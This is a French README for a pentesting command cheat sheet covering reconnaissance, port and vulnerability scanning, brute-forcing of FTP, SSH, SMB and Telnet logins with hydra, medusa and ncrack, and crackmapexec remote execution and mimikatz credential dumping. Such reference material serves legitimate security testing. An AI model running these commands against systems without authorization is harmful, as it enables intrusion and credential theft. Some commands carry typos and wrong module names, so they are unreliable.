Toolbox de Commandes de Sécurité
À propos
Cette toolbox regroupe une série de commandes utiles pour la reconnaissance, les tests de sécurité, et l'exploitation des vulnérabilités. Elle est conçue pour aider les professionnels de la sécurité informatique dans leurs évaluations de la sécurité des systèmes et des réseaux.

Table des matières
🪧 À propos
📦 Prérequis
🚀 Installation
🛠️ Utilisation
🤝 Contribution
🏗️ Construit avec
📚 Documentation
🏷️ Gestion des versions
📝 Licence
Prérequis
Systèmes d'exploitation supportés :

Linux
Windows
macOS
Outils nécessaires :

nslookup
dig
host
whois
wafw00f
whatweb
dnsrecon
ping
fping
traceroute
testssl
sslscan
sslyze
nmap
spiderfoot
nikto
httrack
curl
wapiti
theHarvester
gobuster
sublist3r
dirb
wpscan
snmp-check
enum4linux
nbtscan
smbmap
sqlmap
hydra
medusa
ncrack
PwnXSS
crackmapexec
Beroot
Installation
Clonez le dépôt :

bash
Copy code
git clone https://github.com/votreutilisateur/votredepot.git
cd votredepot
Installez les dépendances nécessaires :

bash
Copy code
sudo apt-get install -y nslookup dnsutils host whois wafw00f whatweb dnsrecon fping traceroute testssl sslscan sslyze nmap spiderfoot nikto httrack curl wapiti theHarvester gobuster sublist3r dirb wpscan snmpcheck enum4linux nbtscan smbmap sqlmap hydra medusa ncrack crackmapexec
Pour les outils spécifiques (PwnXSS, Beroot), suivez les instructions dans leur documentation respective.

Utilisation
Phase de Reconnaissance
Passive
nslookup

bash
Copy code
nslookup URL
nslookup -type=A URL
nslookup -type=MX URL
nslookup -type=TXT URL
dig

bash
Copy code
dig URL
dig URL MX
dig URL A
dig URL TXT
Host command

bash
Copy code
host URL
host -a URL
Whois

bash
Copy code
whois URL
whois IP_ADDRESS
wafw00f

bash
Copy code
wafw00f URL
whatweb

bash
Copy code
whatweb URL
dnsrecon

bash
Copy code
dnsrecon -d URL
dnsrecon -d URL -a
Active
Ping

bash
Copy code
ping -c 5 IP_ADDRESS
ping -c 5 URL
Fping

bash
Copy code
fping -g IP_ADDRESS/24
Traceroute

bash
Copy code
traceroute URL
traceroute IP_ADDRESS
Tests SSL
testssl

bash
Copy code
testssl URL
sslscan

bash
Copy code
sslscan URL
sslyze

bash
Copy code
sslyze URL
Scan de Ports
Nmap classique

bash
Copy code
nmap IP_ADDRESS -p-
Nmap scan OS, services

bash
Copy code
nmap -Pn -sV -A IP_ADDRESS
Nmap scan script

bash
Copy code
nmap -Pn -sC IP_ADDRESS
OSINT
Spiderfoot
bash
Copy code
spiderfoot -s URL
Recherche de Vulnérabilités
Nmap vulnerability

bash
Copy code
nmap -Pn -sV --script vuln IP_ADDRESS
nikto

bash
Copy code
nikto -h IP_ADDRESS
Web
HTTRACK

bash
Copy code
httrack https://URL
Curl

bash
Copy code
curl -v -X http URL
Nmap detect waf

bash
Copy code
nmap --script=http-waf-fingerprint URL
Wapiti

bash
Copy code
wapiti -u https://URL -m sql,xss,xxe
theHarvester

bash
Copy code
theHarvester -d URL -l 10 -b all
gobuster

bash
Copy code
gobuster dir -u https://URL -w /usr/share/wordlists/dirb/big.txt -b 404 -q
Sublist3r

bash
Copy code
sublist3r --domain URL
Dirb

bash
Copy code
dirb https://URL /usr/share/wordlists/dirb/common.txt -S -r
Wpscan

bash
Copy code
wpscan --url URL --random-user-agent
Tests SNMP
Snmpcheck
bash
Copy code
snmp-check IP_ADDRESS
Tests SMB
Nmap smb Discover

bash
Copy code
nmap -p445 --script smb-protocols IP_ADDRESS
enum4linux smb Discover

bash
Copy code
enum4linux -U -o IP_ADDRESS
nbtscan

bash
Copy code
nbtscan IP_ADDRESS/24
SMBmap

bash
Copy code
smbmap -H IP_ADDRESS
Tests Database
Sqlmap
bash
Copy code
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
Attaque par Mot de Passe
FTP Server
hydra FTP

bash
Copy code
hydra -t 1 -V -f -l Anonymous -P /usr/share/wordlists/dirb/small.txt IP_ADDRESS ftp
Medusa FTP

bash
Copy code
medusa -h IP_ADDRESS -u Anonymous -P /usr/share/wordlists/dirb/small.txt -M ftp
ncrack FTP

bash
Copy code
ncrack -p 21 --user Anonymous -P /usr/share/wordlists/dirb/small.txt IP_ADDRESS
SMB Server
hydra SMB

bash
Copy code
hydra -t 1 -V -f -l admin -P /usr/share/wordlists/dirb/small.txt IP_ADDRESS smb
Medusa SMB

bash
Copy code
medusa -h IP_ADDRESS -u admin -P /usr/share/wordlists/dirb/small.txt -M smbnt
SMTP Server
hydra SMTP

bash
Copy code
hydra -t 1 -V -f -l admin -P /usr/share/wordlists/dirb/small.txt IP_ADDRESS smsmtp
Medusa SMTP

bash
Copy code
medusa -h IP_ADDRESS -u admin -P /usr/share/wordlists/dirb/small.txt -M snmtp
MYSQL Server
hydra MYSQL

bash
Copy code
hydra -t 1 -V -f -L /usr/share/wordlists/others/names.txt -P /usr/share/wordlists/dirb/small.txt URL mysql
Medusa MYSQL

bash
Copy code
medusa -h IP_ADDRESS -u admin -P /usr/share/wordlists/dirb/small.txt -M mssql
SNMP Server
hydra SNMP

bash
Copy code
hydra -P /usr/share/wordlists/dirb/small.txt -v IP_ADDRESS snmp
Medusa SNMP

bash
Copy code
medusa -h IP_ADDRESS -u admin -P /usr/share/wordlists/dirb/small.txt -M snmp
SSH
hydra SSH

bash
Copy code
hydra -v -V -u -L /usr/share/wordlists/others/names.txt -P /usr/share/wordlists/dirb/small.txt -t 1 -u IP_ADDRESS ssh
Medusa SSH

bash
Copy code
medusa -h IP_ADDRESS -u admin -P /usr/share/wordlists/dirb/small.txt -M ssh
ncrack SSH

bash
Copy code
ncrack -p 22 --user root -P passwords.txt IP_ADDRESS [-T 5]
LDAP
Nmap LDAP BF
bash
Copy code
nmap --script ldap-brute -p 389 IP_ADDRESS
TELNET
hydra TELNET

bash
Copy code
hydra -l root -P /usr/share/wordlists/dirb/small.txt -t 32 IP_ADDRESS telnet
ncrack TELNET

bash
Copy code
ncrack -p 23 --user root -P /usr/share/wordlists/dirb/small.txt IP_ADDRESS -T 5
Medusa TELNET

bash
Copy code
medusa -u root -P /usr/share/wordlists/dirb/small.txt -h IP_ADDRESS -M telnet
Exploitation
PwnXSS

bash
Copy code
python3 PwnXSS/pwnxss.py -u https://URL
crackmapexec

bash
Copy code
crackmapexec IP_ADDRESS -u utilisateur -p motdepasse --shares
crackmapexec IP_ADDRESS -u utilisateur -p motdepasse --exec-command 'whoami'
crackmapexec IP_ADDRESS/24 -u ‘admin’ -p ‘P@ssw0rd’
crackmapexec IP_ADDRESS -u utilisateur -p motdepasse --mimikatz
Post Exploitation
Beroot
bash
Copy code
python3 Beroot/Linux/beroot.py
python3 Beroot/Windows/beroot.py
Contribution
Flux de Contribution
Forkez le projet.
Créez une branche pour votre fonctionnalité (git checkout -b feature/AmazingFeature).
Commitez vos modifications (git commit -m 'Add some AmazingFeature').
Pushez vers la branche (git push origin feature/AmazingFeature).
Ouvrez une Pull Request.
Construit avec
Langages & Frameworks
Python
Outils
CI
GitHub Actions
Déploiement
Docker
Documentation
Pour plus d'informations, veuillez consulter la documentation officielle de chaque outil mentionné dans les sections précédentes.

Gestion des versions
Afin de maintenir un cycle de publication clair et de favoriser la rétrocompatibilité, la dénomination des versions suit la spécification décrite par la Gestion sémantique de version.

Les versions disponibles ainsi que les journaux décrivant les changements apportés sont disponibles depuis la page des Releases.

Licence
Voir le fichier LICENSE du dépôt.
